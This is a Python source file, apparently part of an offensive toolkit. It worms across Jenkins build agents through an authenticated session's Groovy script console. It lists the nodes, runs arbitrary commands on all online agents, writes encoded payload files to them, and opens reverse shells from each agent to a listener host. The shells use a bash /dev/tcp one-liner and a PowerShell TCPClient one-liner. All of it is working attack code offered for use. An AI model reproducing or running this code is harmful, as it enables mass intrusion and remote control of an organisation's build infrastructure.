"""Jenkins agent/node worming for distributed lateral movement.

Enumerates and exploits Jenkins build agents (nodes) in master/agent
architectures, enabling simultaneous command execution across the entire
Jenkins infrastructure.
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional


class NodeStatus(Enum):
    """Jenkins node status."""
    ONLINE = "online"
    OFFLINE = "offline"
    TEMPORARILY_OFFLINE = "temporarily_offline"
    UNKNOWN = "unknown"


@dataclass
class JenkinsNode:
    """Represents a Jenkins build agent/node."""
    name: str
    host: str
    status: NodeStatus
    os: Optional[str] = None
    architecture: Optional[str] = None
    num_executors: int = 1
    labels: list[str] = field(default_factory=list)
    workspace_path: Optional[str] = None
    metadata: dict[str, Any] = field(default_factory=dict)


@dataclass
class NodeExecutionResult:
    """Result of command execution on a node."""
    node_name: str
    success: bool
    output: Optional[str] = None
    error: Optional[str] = None
    exit_code: Optional[int] = None


@dataclass
class WormingResult:
    """Result of node worming operation."""
    total_nodes: int
    online_nodes: int
    successful_executions: int
    failed_executions: int
    results: list[NodeExecutionResult]


class NodeWorm:
    """Lateral movement and exploitation of Jenkins build agents."""

    def __init__(self, session: Any):
        """Initialize node worm.

        Args:
            session: Authenticated Jenkins session
        """
        self.session = session

    def enumerate_nodes(self) -> list[JenkinsNode]:
        """Enumerate all Jenkins nodes/agents.

        Returns:
            List of JenkinsNode objects
        """
        groovy_code = """
import jenkins.model.Jenkins
import hudson.model.Computer

def jenkins = Jenkins.getInstance()
def computers = jenkins.getComputers()

computers.each { computer ->
    def node = computer.getNode()
    def name = computer.getName()

    if (name == "") {
        name = "master"
    }

    def status = "unknown"
    if (computer.isOnline()) {
        status = "online"
    } else if (computer.isTemporarilyOffline()) {
        status = "temporarily_offline"
    } else {
        status = "offline"
    }

    def host = "unknown"
    def os = "unknown"
    def arch = "unknown"
    def workspace = "unknown"

    if (computer.isOnline()) {
        try {
            def channel = computer.getChannel()
            if (channel != null) {
                os = channel.call(new hudson.remoting.Callable<String, Exception>() {
                    String call() {
                        return System.getProperty("os.name")
                    }
                })

                arch = channel.call(new hudson.remoting.Callable<String, Exception>() {
                    String call() {
                        return System.getProperty("os.arch")
                    }
                })

                host = channel.call(new hudson.remoting.Callable<String, Exception>() {
                    String call() {
                        return InetAddress.getLocalHost().getHostName()
                    }
                })

                workspace = channel.call(new hudson.remoting.Callable<String, Exception>() {
                    String call() {
                        return System.getProperty("user.dir")
                    }
                })
            }
        } catch (Exception e) {
            // Ignore channel errors
        }
    }

    def numExecutors = computer.getNumExecutors()
    def labels = node != null ? node.getLabelString() : ""

    println "NODE:" + name + "||" + host + "||" + status + "||" + os + "||" + arch + "||" + numExecutors + "||" + labels + "||" + workspace
}
"""

        result = self.session.execute_groovy(groovy_code)

        nodes = []
        for line in result.split('\n'):
            if line.startswith("NODE:"):
                parts = line[5:].split("||")
                if len(parts) >= 8:
                    status_str = parts[2].strip().lower()
                    status = NodeStatus.ONLINE if status_str == "online" else \
                            NodeStatus.TEMPORARILY_OFFLINE if status_str == "temporarily_offline" else \
                            NodeStatus.OFFLINE if status_str == "offline" else NodeStatus.UNKNOWN

                    labels = [l.strip() for l in parts[6].split() if l.strip()]

                    node = JenkinsNode(
                        name=parts[0].strip(),
                        host=parts[1].strip(),
                        status=status,
                        os=parts[3].strip() if parts[3].strip() != "unknown" else None,
                        architecture=parts[4].strip() if parts[4].strip() != "unknown" else None,
                        num_executors=int(parts[5].strip()) if parts[5].strip().isdigit() else 1,
                        labels=labels,
                        workspace_path=parts[7].strip() if parts[7].strip() != "unknown" else None
                    )
                    nodes.append(node)

        return nodes

    def execute_on_node(self,
                       node_name: str,
                       command: str,
                       timeout: int = 60) -> NodeExecutionResult:
        """Execute command on specific node.

        Args:
            node_name: Target node name
            command: Command to execute
            timeout: Execution timeout in seconds

        Returns:
            NodeExecutionResult with output
        """
        if node_name == "master":
            node_name = ""

        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.model.Computer
import hudson.util.RemotingDiagnostics

def jenkins = Jenkins.getInstance()
def computer = jenkins.getComputer('{node_name}')

if (computer == null) {{
    println "ERROR:Node not found"
    return
}}

if (!computer.isOnline()) {{
    println "ERROR:Node is offline"
    return
}}

try {{
    def script = '''
def proc = "{command}".execute()
proc.waitForOrKill({timeout * 1000})
def output = proc.text
def exitCode = proc.exitValue()
println "OUTPUT:" + output
println "EXIT_CODE:" + exitCode
'''

    def result = RemotingDiagnostics.executeGroovy(script, computer.getChannel())
    println result
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if result.startswith("ERROR"):
            return NodeExecutionResult(
                node_name=node_name,
                success=False,
                error=result
            )

        output = None
        exit_code = None

        for line in result.split('\n'):
            if line.startswith("OUTPUT:"):
                output = line[7:].strip()
            elif line.startswith("EXIT_CODE:"):
                try:
                    exit_code = int(line[10:].strip())
                except ValueError:
                    pass

        return NodeExecutionResult(
            node_name=node_name,
            success=True,
            output=output,
            exit_code=exit_code
        )

    def execute_on_all_nodes(self,
                            command: str,
                            include_master: bool = False,
                            timeout: int = 60) -> WormingResult:
        """Execute command on all online nodes simultaneously.

        Args:
            command: Command to execute
            include_master: Whether to execute on master node
            timeout: Execution timeout per node

        Returns:
            WormingResult with all execution results
        """
        nodes = self.enumerate_nodes()
        online_nodes = [n for n in nodes if n.status == NodeStatus.ONLINE]

        if not include_master:
            online_nodes = [n for n in online_nodes if n.name != "master"]

        results = []
        successful = 0
        failed = 0

        for node in online_nodes:
            exec_result = self.execute_on_node(node.name, command, timeout)
            results.append(exec_result)

            if exec_result.success:
                successful += 1
            else:
                failed += 1

        return WormingResult(
            total_nodes=len(nodes),
            online_nodes=len(online_nodes),
            successful_executions=successful,
            failed_executions=failed,
            results=results
        )

    def deploy_payload_to_node(self,
                               node_name: str,
                               payload_path: str,
                               payload_content: str) -> NodeExecutionResult:
        """Deploy payload file to specific node.

        Args:
            node_name: Target node
            payload_path: Path where payload should be written
            payload_content: Payload content

        Returns:
            NodeExecutionResult
        """
        if node_name == "master":
            node_name = ""

        import base64
        encoded_payload = base64.b64encode(payload_content.encode()).decode()

        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.util.RemotingDiagnostics

def jenkins = Jenkins.getInstance()
def computer = jenkins.getComputer('{node_name}')

if (computer == null) {{
    println "ERROR:Node not found"
    return
}}

if (!computer.isOnline()) {{
    println "ERROR:Node is offline"
    return
}}

try {{
    def script = '''
import java.util.Base64

def payloadPath = "{payload_path}"
def encodedContent = "{encoded_payload}"

def decodedBytes = Base64.getDecoder().decode(encodedContent)
def content = new String(decodedBytes, "UTF-8")

def file = new File(payloadPath)
file.getParentFile()?.mkdirs()
file.text = content

println "SUCCESS:Payload deployed to " + payloadPath
'''

    def result = RemotingDiagnostics.executeGroovy(script, computer.getChannel())
    println result
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if "SUCCESS" in result:
            return NodeExecutionResult(
                node_name=node_name,
                success=True,
                output=result
            )
        else:
            return NodeExecutionResult(
                node_name=node_name,
                success=False,
                error=result
            )

    def deploy_payload_to_all_nodes(self,
                                   payload_path: str,
                                   payload_content: str,
                                   include_master: bool = False) -> WormingResult:
        """Deploy payload to all online nodes.

        Args:
            payload_path: Target path on nodes
            payload_content: Payload content
            include_master: Include master node

        Returns:
            WormingResult
        """
        nodes = self.enumerate_nodes()
        online_nodes = [n for n in nodes if n.status == NodeStatus.ONLINE]

        if not include_master:
            online_nodes = [n for n in online_nodes if n.name != "master"]

        results = []
        successful = 0
        failed = 0

        for node in online_nodes:
            deploy_result = self.deploy_payload_to_node(
                node.name,
                payload_path,
                payload_content
            )
            results.append(deploy_result)

            if deploy_result.success:
                successful += 1
            else:
                failed += 1

        return WormingResult(
            total_nodes=len(nodes),
            online_nodes=len(online_nodes),
            successful_executions=successful,
            failed_executions=failed,
            results=results
        )

    def establish_reverse_shells(self,
                                 lhost: str,
                                 lport_start: int,
                                 include_master: bool = False) -> WormingResult:
        """Establish reverse shells from all nodes.

        Args:
            lhost: Listener host
            lport_start: Starting port (increments per node)
            include_master: Include master

        Returns:
            WormingResult
        """
        nodes = self.enumerate_nodes()
        online_nodes = [n for n in nodes if n.status == NodeStatus.ONLINE]

        if not include_master:
            online_nodes = [n for n in online_nodes if n.name != "master"]

        results = []
        successful = 0
        failed = 0
        current_port = lport_start

        for node in online_nodes:
            os_type = node.os.lower() if node.os else "linux"

            if "windows" in os_type:
                command = f'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{current_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
            else:
                command = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{current_port} 0>&1' &"

            exec_result = self.execute_on_node(node.name, command)
            exec_result.output = f"Reverse shell to {lhost}:{current_port}"
            results.append(exec_result)

            if exec_result.success:
                successful += 1
            else:
                failed += 1

            current_port += 1

        return WormingResult(
            total_nodes=len(nodes),
            online_nodes=len(online_nodes),
            successful_executions=successful,
            failed_executions=failed,
            results=results
        )


def enumerate_jenkins_nodes(session: Any) -> list[JenkinsNode]:
    """Quick enumeration of all Jenkins nodes.

    Args:
        session: Jenkins session

    Returns:
        List of JenkinsNode objects
    """
    worm = NodeWorm(session)
    return worm.enumerate_nodes()


def execute_on_all_nodes(session: Any,
                         command: str,
                         include_master: bool = False) -> WormingResult:
    """Execute command across all nodes.

    Args:
        session: Jenkins session
        command: Command to execute
        include_master: Include master node

    Returns:
        WormingResult
    """
    worm = NodeWorm(session)
    return worm.execute_on_all_nodes(command, include_master)


def worm_all_nodes(session: Any,
                   lhost: str,
                   lport_start: int = 4444) -> WormingResult:
    """Establish reverse shells from all nodes.

    Args:
        session: Jenkins session
        lhost: Listener host
        lport_start: Starting port number

    Returns:
        WormingResult
    """
    worm = NodeWorm(session)
    return worm.establish_reverse_shells(lhost, lport_start)
